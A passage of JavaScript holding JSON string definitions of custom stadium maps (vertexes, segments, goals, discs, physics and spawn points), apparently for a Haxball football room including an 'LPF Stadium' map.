"B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 226 */ { "x" : 0, "y" : 90, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 227 */ { "x" : 0, "y" : -90, "cMask" : ["red","blue" ], "color" : "B6B6B8", "cGroup" : ["redKO" ], "curve" : 180 }, /* 228 */ { "x" : 0, "y" : 90, "cMask" : ["red","blue" ], "color" : "B6B6B8", "cGroup" : ["redKO" ], "curve" : 180 }, /* 229 */ { "x" : 0, "y" : -90, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 230 */ { "x" : 0, "y" : 90, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180 }, /* 231 */ { "x" : 0, "y" : -90, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180, "_selected" : "segment" }, /* 232 */ { "x" : 0, "y" : 90, "cMask" : ["wall" ], "color" : "B6B6B8", "bCoef" : 0.1, "curve" : 180, "_selected" : "segment" } ], "segments" : [ { "v0" : 0, "v1" : 1, "trait" : "nc", "color" : "FFCCCC" }, { "v0" : 0, "v1" : 2, "trait" : "n", "color" : "F5072F" }, { "v0" : 4, "v1" : 3, "trait" : "n", "color" : "FFFFFF" }, { "v0" : 5, "v1" : 1, "trait" : "n", "color" : "F5072F" }, { "v0" : 2, "v1" : 4, "trait" : "n", "curve" : -90, "color" : "F5072F" }, { "v0" : 3, "v1" : 5, "trait" : "n", "curve" : -90, "color" : "F5072F" }, { "v0" : 7, "v1" : 6, "trait" : "nc", "color" : "CCCCFF" }, { "v0" : 8, "v1" : 6, "trait" : "n", "color" : "F5072F" }, { "v0" : 9, "v1" : 10, "trait" : "n", "color" : "FFFFFF" }, { "v0" : 7, "v1" : 11, "trait" : "n", "color" : "F5072F" }, { "v0" : 10, "v1" : 8, "trait" : "n", "curve" : -90, "color" : "F5072F" }, { "v0" : 11, "v1" : 9, "trait" : "n", "curve" : -90, "color" : "F5072F" }, { "v0" : 16, "v1" : 17, "trait" : "ko", "color" : "B6B6B8", "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ] }, { "v0" : 16, "v1" : 18, "trait" : "ko", "vis" : false }, { "v0" : 222, "v1" : 221, "bCoef" : 0.1, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : ["red","blue" ], "cGroup" : ["blueKO" ], "color" : "B6B6B8" }, { "v0" : 224, "v1" : 223, "bCoef" : 0.1, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : ["wall" ], "color" : "B6B6B8" }, { "v0" : 226, "v1" : 225, "bCoef" : 0.1, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : ["wall" ], "color" : "B6B6B8" }, { "v0" : 21, "v1" : 20, "trait" : "bb", "color" : "FFFFFF" }, { "v0" : 20, "v1" : 0, "trait" : "bb", "color" : "FFFFFF" }, { "v0" : 1, "v1" : 22, "trait" : "bb", "color" : "FFFFFF" }, { "v0" : 23, "v1" : 19, "trait" : "ko", "color" : "B6B6B8", "cMask" : ["red","blue" ], "cGroup" : ["redKO","blueKO" ] }, { "v0" : 23, "v1" : 24, "trait" : "ko", "vis" : false }, { "v0" : 227, "v1" : 228, "bCoef" : 0.1, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : ["red","blue" ], "cGroup" : ["redKO" ], "color" : "B6B6B8" }, { "v0" : 229, "v1" : 230, "bCoef" : 0.1, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : ["wall" ], "color" : "B6B6B8" }, { "v0" : 231, "v1" : 232, "bCoef" : 0.1, "curve" : 180, "curveF" : 6.123233995736766e-17, "cMask" : ["wall" ], "color" : "B6B6B8", "_selected" : true }, { "v0" : 22, "v1" : 25, "trait" : "bb", "color" : "FFFFFF" }, { "v0" : 6, "v1" : 21, "trait" : "bb", "color" : "FFFFFF" }, { "v0" : 25, "v1" : 7, "trait" : "bb", "color" : "FFFFFF" }, { "v0" : 12, "v1" : 13, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 180 }, { "v0" : 14, "v1" : 15, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 180 }, { "v0" : 26, "v1" : 27, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 28, "v1" : 29, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 30, "v1" : 31, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 32, "v1" : 33, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 34, "v1" : 35, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 36, "v1" : 37, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 38, "v1" : 39, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 40, "v1" : 41, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 42, "v1" : 43, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 44, "v1" : 45, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 46, "v1" : 47, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 48, "v1" : 49, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 50, "v1" : 51, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 52, "v1" : 53, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 54, "v1" : 55, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 56, "v1" : 57, "bCoef" : 0.1, "cMask" : [ ], "color" : "FFFFFF" }, { "v0" : 58, "v1" : 59, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 59, "v1" : 60, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 60, "v1" : 61, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 61, "v1" : 62, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 62, "v1" : 58, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 63, "v1" : 64, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 64, "v1" : 65, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 65, "v1" : 66, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 67, "v1" : 68, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 68, "v1" : 69, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 69, "v1" : 70, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 70, "v1" : 67, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 69, "v1" : 71, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 71, "v1" : 72, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 73, "v1" : 74, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 74, "v1" : 75, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 75, "v1" : 76, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 90 }, { "v0" : 76, "v1" : 77, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 79, "v1" : 80, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 80, "v1" : 81, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 81, "v1" : 78, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 120 }, { "v0" : 82, "v1" : 83, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 83, "v1" : 84, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 84, "v1" : 85, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 85, "v1" : 86, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 86, "v1" : 87, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 87, "v1" : 88, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 88, "v1" : 82, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 89, "v1" : 90, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 90, "v1" : 91, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 91, "v1" : 92, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 92, "v1" : 93, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 93, "v1" : 94, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 94, "v1" : 95, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 95, "v1" : 85, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 63, "v1" : 96, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 35 }, { "v0" : 66, "v1" : 96, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 40 }, { "v0" : 97, "v1" : 98, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 99, "v1" : 100, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 101, "v1" : 102, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 103, "v1" : 104, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 105, "v1" : 106, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 107, "v1" : 108, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 109, "v1" : 110, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 111, "v1" : 112, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 113, "v1" : 114, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 115, "v1" : 116, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 117, "v1" : 118, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 119, "v1" : 120, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 121, "v1" : 122, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 123, "v1" : 124, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 125, "v1" : 126, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 127, "v1" : 128, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 129, "v1" : 130, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 131, "v1" : 132, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 133, "v1" : 134, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 135, "v1" : 136, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 137, "v1" : 138, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 139, "v1" : 140, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 141, "v1" : 142, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 143, "v1" : 144, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 145, "v1" : 146, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 147, "v1" : 148, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 149, "v1" : 150, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 151, "v1" : 152, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 153, "v1" : 154, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 155, "v1" : 156, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 157, "v1" : 158, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 159, "v1" : 160, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 161, "v1" : 162, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 163, "v1" : 164, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 165, "v1" : 166, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 167, "v1" : 168, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 169, "v1" : 170, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 171, "v1" : 172, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 30.5 }, { "v0" : 173, "v1" : 174, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 30.5 }, { "v0" : 175, "v1" : 176, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 39.181884674082816 }, { "v0" : 177, "v1" : 178, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 33.147490369972004 }, { "v0" : 179, "v1" : 180, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 30.86073135771021 }, { "v0" : 181, "v1" : 182, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 35.19051396221234 }, { "v0" : 183, "v1" : 184, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 33.147490369972004 }, { "v0" : 185, "v1" : 186, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 23.18828044702916 }, { "v0" : 187, "v1" : 188, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 74.35999658908567 }, { "v0" : 189, "v1" : 190, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 16.4540974994641 }, { "v0" : 191, "v1" : 192, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 16.908293850310912 }, { "v0" : 193, "v1" : 194, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : -0.8470831489067162 }, { "v0" : 195, "v1" : 196, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : -18.2525990617023 }, { "v0" : 197, "v1" : 198, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 23.18828044702916 }, { "v0" : 199, "v1" : 200, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 3.434732992799685 }, { "v0" : 201, "v1" : 202, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 203, "v1" : 204, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 205, "v1" : 206, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 207, "v1" : 208, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 209, "v1" : 210, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 211, "v1" : 212, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 213, "v1" : 214, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 215, "v1" : 216, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 217, "v1" : 218, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 219, "v1" : 220, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 95, "v1" : 182, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 95, "v1" : 180, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 5.1503946672979835 }, { "v0" : 95, "v1" : 180, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 50 }, { "v0" : 75, "v1" : 186, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : -63.384007741436164 }, { "v0" : 75, "v1" : 190, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : -58.93414564563431 }, { "v0" : 75, "v1" : 77, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : -63.67867690950191 }, { "v0" : 190, "v1" : 202, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 30.35408736274531 }, { "v0" : 190, "v1" : 204, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 38.71906519735212 }, { "v0" : 190, "v1" : 206, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 40.1697553109201 }, { "v0" : 190, "v1" : 208, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 190, "v1" : 210, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 190, "v1" : 212, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 58.83648077641912 }, { "v0" : 190, "v1" : 214, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 190, "v1" : 216, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 190, "v1" : 218, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 66.76949146697507 }, { "v0" : 190, "v1" : 220, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : -15.362643708078915 }, { "v0" : 186, "v1" : 76, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" } ], "planes" : [ { "normal" : [0,1 ], "dist" : -270, "trait" : "pb" }, { "normal" : [0,-1 ], "dist" : -270, "trait" : "pb" }, { "normal" : [1,0 ], "dist" : -620, "trait" : "pb" }, { "normal" : [-1,0 ], "dist" : -620, "trait" : "pb" } ], "goals" : [ { "p0" : [-556.25,-80 ], "p1" : [-556.25,80 ], "team" : "red" }, { "p0" : [556.25,-80 ], "p1" : [556.25,80 ], "team" : "blue" } ], "discs" : [ { "pos" : [0,0 ], "cGroup" : ["ball","kick","score" ], "radius" : 6.25, "color" : "FFCC00", "bCoef" : 0.4, "invMass" : 1.5 }, { "pos" : [-550,-80 ], "trait" : "p", "color" : "FF0000" }, { "pos" : [-550,80 ], "trait" : "p", "color" : "FF0000" }, { "pos" : [550,-80 ], "trait" : "p", "color" : "0022FD" }, { "pos" : [550,80 ], "trait" : "p", "color" : "0022FD" }, { "pos" : [-550,240 ], "radius" : 3, "bCoef" : 0.1, "invMass" : 0, "color" : "FFCC00", "cMask" : [ ] }, { "pos" : [-550,-240 ], "radius" : 3, "bCoef" : 0.1, "invMass" : 0, "color" : "FFCC00", "cMask" : [ ] }, { "pos" : [550,-240 ], "radius" : 3, "bCoef" : 0.1, "invMass" : 0, "color" : "FFCC00", "cMask" : [ ] }, { "pos" : [550,240 ], "radius" : 3, "bCoef" : 0.1, "invMass" : 0, "color" : "FFCC00", "cMask" : [ ] } ], "ballPhysics" : "disc0", "playerPhysics" : { "bCoef" : 0, "acceleration" : 0.11, "kickingAcceleration" : 0.083 }, "traits" : { "v" : { "cMask" : ["" ] }, "bb" : { "cMask" : ["ball" ], "bias" : 99, "color" : "1E252A" }, "pb" : { "bCoef" : 1, "cMask" : ["all" ], "bias" : 99 }, "nc" : { "cMask" : ["" ], "color" : "737573" }, "p" : { "radius" : 5, "invMass" : 0 }, "n" : { "bCoef" : 0.1, "cMask" : ["ball" ], "bias" : 3, "color" : "DA4D4B" }, "ko" : { "bCoef" : 0.1, "cGroup" : ["redKO","blueKO" ], "cMask" : ["red","blue" ], "color" : "737573" } }, "spawnDistance" : 160, "redSpawnPoints" : [ [ -310, 0 ], [ -245, -60 ], [ -245, 60 ], [ -620, 0 ] ], "blueSpawnPoints" : [ [ 310, 0 ], [ 245, 60 ], [ 245, -60 ], [ 620, 0 ] ] }'; // Read above

var mapa4vs4Azul = '{ "name" : "✨「 𝗟𝗣𝗙 𝗦𝘁𝗮𝗱𝗶𝘂𝗺 🇵🇪 」✨", "width" : 900, "height" : 380, "redSpawnPoints" : [ [ -150, -100 ], [ -150, 100 ], [ -380, 0 ], [ -600, 0 ], [ -770, 0 ] ], "blueSpawnPoints" : [ [ 150, 100 ], [ 150, -100 ], [ 380, 0 ], [ 600, 0 ], [ 770, 0 ] ], "bg" : { "type" : "hockey" }, "vertexes" : [ /* 0 */ { "x" : -700, "y" : -85, "cMask" : [ ], "color" : "F5072F" }, /* 1 */ { "x" : -700, "y" : 85, "cMask" : [ ], "color" : "F5072F" }, /* 2 */ { "x" : -710, "y" : -85, "cMask" : [ ], "color" : "F5072F" }, /* 3 */ { "x" : -730, "y" : 65, "cMask" : [ ] }, /* 4 */ { "x" : -730, "y" : -65, "cMask" : [ ] }, /* 5 */ { "x" : -710, "y" : 85, "cMask" : [ ], "color" : "F5072F" }, /* 6 */ { "x" : 700, "y" : -85, "cMask" : [ ], "color" : "F5072F" }, /* 7 */ { "x" : 700, "y" : 85, "cMask" : [ ], "color" : "F5072F" }, /* 8 */ { "x" : 710, "y" : -85, "cMask" : [ ], "color" : "F5072F" }, /* 9 */ { "x" : 730, "y" : 65, "cMask" : [ ] }, /* 10 */ { "x" : 730, "y" : -65, "cMask" : [ ] }, /* 11 */ { "x" : 710, "y" : 85, "cMask" : [ ], "color" : "F5072F" }, /* 12 */ { "x" : -700, "y" : -285, "cMask" : [ ], "color" : "B6B6B8" }, /* 13 */ { "x" : -700, "y" : 285, "cMask" : [ ], "color" : "B6B6B8" }, /* 14 */ { "x" : 700, "y" : 285, "cMask" : [ ], "color" : "B6B6B8" }, /* 15 */ { "x" : 700, "y" : -285, "cMask" : [ ], "color" : "B6B6B8" }, /* 16 */ { "x" : 0, "y" : -320, "cMask" : [ ], "color" : "B6B6B8" }, /* 17 */ { "x" : 0, "y" : -100, "cMask" : [ ], "color" : "B6B6B8" }, /* 18 */ { "x" : 0, "y" : -350, "cMask" : [ ] }, /* 19 */ { "x" : 0, "y" : 100, "cMask" : [ ], "color" : "B6B6B8" }, /* 20 */ { "x" : -700, "y" : -320, "cMask" : [ ] }, /* 21 */ { "x" : 700, "y" : -320, "cMask" : [ ] }, /* 22 */ { "x" : -700, "y" : 320, "cMask" : [ ] }, /* 23 */ { "x" : 0, "y" : 320, "cMask" : [ ], "color" : "B6B6B8" }, /* 24 */ { "x" : 0, "y" : 350, "cMask" : [ ] }, /* 25 */ { "x" : 700, "y" : 320, "cMask" : [ ] }, /* 26 */ { "x" : -450, "y" : -342, "cMask" : [ ] }, /* 27 */ { "x" : -450, "y" : -297, "cMask" : [ ] }, /* 28 */ { "x" : -350, "y" : -342, "cMask" : [ ] }, /* 29 */ { "x" : -350, "y" : -297, "cMask" : [ ] }, /* 30 */ { "x" : -250, "y" : -342, "cMask" : [ ] }, /* 31 */ { "x" : -250, "y" : -297, "cMask" : [ ] }, /* 32 */ { "x" : 250, "y" : -342, "cMask" : [ ] }, /* 33 */ { "x" : 250, "y" : -297, "cMask" : [ ] }, /* 34 */ { "x" : 350, "y" : -342, "cMask" : [ ] }, /* 35 */ { "x" : 350, "y" : -297, "cMask" : [ ] }, /* 36 */ { "x" : 450, "y" : -342, "cMask" : [ ] }, /* 37 */ { "x" : 450, "y" : -297, "cMask" : [ ] }, /* 38 */ { "x" : -450, "y" : 298, "cMask" : [ ] }, /* 39 */ { "x" : -450, "y" : 345, "cMask" : [ ] }, /* 40 */ { "x" : -350, "y" : 298, "cMask" : [ ] }, /* 41 */ { "x" : -350, "y" : 345, "cMask" : [ ] }, /* 42 */ { "x" : -250, "y" : 298, "cMask" : [ ] }, /* 43 */ { "x" : -250, "y" : 345, "cMask" : [ ] }, /* 44 */ { "x" : 250, "y" : 298, "cMask" : [ ] }, /* 45 */ { "x" : 250, "y" : 345, "cMask" : [ ] }, /* 46 */ { "x" : 350, "y" : 298, "cMask" : [ ] }, /* 47 */ { "x" : 350, "y" : 345, "cMask" : [ ] }, /* 48 */ { "x" : 450, "y" : 298, "cMask" : [ ] }, /* 49 */ { "x" : 450, "y" : 345, "cMask" : [ ] }, /* 50 */ { "x" : -730, "y" : -160, "cMask" : [ ] }, /* 51 */ { "x" : -675, "y" : -160, "cMask" : [ ] }, /* 52 */ { "x" : -730, "y" : 160, "cMask" : [ ] }, /* 53 */ { "x" : -675, "y" : 160, "cMask" : [ ] }, /* 54 */ { "x" : 675, "y" : -160, "cMask" : [ ] }, /* 55 */ { "x" : 730, "y" : -160, "cMask" : [ ] }, /* 56 */ { "x" : 675, "y" : 160, "cMask" : [ ] }, /* 57 */ { "x" : 730, "y" : 160, "cMask" : [ ] }, /* 58 */ { "x" : -76.70789660935554, "y" : 38.34883878849523, "cMask" : [ ], "color" : "B6B6B8" }, /* 59 */ { "x" : -76.70789660935554, "y" : 31.08816078141045, "cMask" : [ ], "color" : "B6B6B8" }, /* 60 */ { "x" : -62.18654059518597, "y" : 23.827482774325667, "cMask" : [ ], "color" : "B6B6B8" }, /* 61 */ { "x" : -33.14382856684685, "y" : 23.827482774325667, "cMask" : [ ], "color" : "B6B6B8" }, /* 62 */ { "x" : -33.14382856684685, "y" : 38.34883878849523, "cMask" : [ ], "color" : "B6B6B8" }, /* 63 */ { "x" : -76.70789660935554, "y" : 12.936465763698493, "cMask" : [ ], "curve" : 35, "color" : "B6B6B8" }, /* 64 */ { "x" : -76.70789660935554, "y" : -41.51861928943738, "cMask" : [ ], "color" : "B6B6B8" }, /* 65 */ { "x" : -62.18654059518597, "y" : -41.51861928943738, "cMask" : [ ], "color" : "B6B6B8" }, /* 66 */ { "x" : -62.18654059518597, "y" : -3.763093652596507, "cMask" : [ ], "curve" : 40, "color" : "B6B6B8" }, /* 67 */ { "x" : -22.252811556219672, "y" : 38.34883878849523, "cMask" : [ ], "color" : "B6B6B8" }, /* 68 */ { "x" : -22.252811556219672, "y" : 8.580058959447626, "cMask" : [ ], "color" : "B6B6B8" }, /* 69 */ { "x" : -7.731455542050106, "y" : 4.2236521551967545, "cMask" : [ ], "color" : "B6B6B8" }, /* 70 */ { "x" : -7.731455542050106, "y" : 38.34883878849523, "cMask" : [ ], "color" : "B6B6B8" }, /* 71 */ { "x" : 2.43349366786859, "y" : 2.0454487530713177, "cMask" : [ ], "color" : "B6B6B8" }, /* 72 */ { "x" : 5.337764870702504, "y" : 2.0454487530713177, "cMask" : [ ], "color" : "B6B6B8" }, /* 73 */ { "x" : -22.252811556219672, "y" : -3.763093652596507, "cMask" : [ ], "color" : "B6B6B8" }, /* 74 */ { "x" : -22.252811556219672, "y" : -41.51861928943738, "cMask" : [ ], "color" : "B6B6B8" }, /* 75 */ { "x" : 5.337764870702504, "y" : -41.51861928943738, "cMask" : [ ], "color" : "B6B6B8" }, /* 76 */ { "x" : 21.31125648628903, "y" : -23.36692427172542, "cMask" : [ ], "color" : "B6B6B8" }, /* 77 */ { "x" : 21.31125648628903, "y" : -8.845568257555856, "cMask" : [ ], "color" : "B6B6B8" }, /* 78 */ { "x" : 3.1595614685770688, "y" : -12.475907261098248, "cMask" : [ ], "color" : "B6B6B8" }, /* 79 */ { "x" : -7.731455542050106, "y" : -6.66736485543042, "cMask" : [ ], "color" : "B6B6B8" }, /* 80 */ { "x" : -7.731455542050106, "y" : -26.997263275267812, "cMask" : [ ], "color" : "B6B6B8" }, /* 81 */ { "x" : 3.1595614685770688, "y" : -26.997263275267812, "cMask" : [ ], "color" : "B6B6B8" }, /* 82 */ { "x" : 32.202273496916206, "y" : 38.34883878849523, "cMask" : [ ], "color" : "B6B6B8" }, /* 83 */ { "x" : 32.202273496916206, "y" : -2.3109580511795498, "cMask" : [ ], "color" : "B6B6B8" }, /* 84 */ { "x" : 46.72362951108576, "y" : -3.763093652596507, "cMask" : [ ], "color" : "B6B6B8" }, /* 85 */ { "x" : 68.50566353234011, "y" : -3.763093652596507, "cMask" : [ ], "color" : "B6B6B8" }, /* 86 */ { "x" : 68.50566353234011, "y" : 2.0454487530713177, "cMask" : [ ], "color" : "B6B6B8" }, /* 87 */ { "x" : 46.72362951108576, "y" : 2.0454487530713177, "cMask" : [ ], "color" : "B6B6B8" }, /* 88 */ { "x" : 46.72362951108576, "y" : 38.34883878849523, "cMask" : [ ], "color" : "B6B6B8" }, /* 89 */ { "x" : 32.202273496916206, "y" : -8.845568257555856, "cMask" : [ ], "color" : "B6B6B8" }, /* 90 */ { "x" : 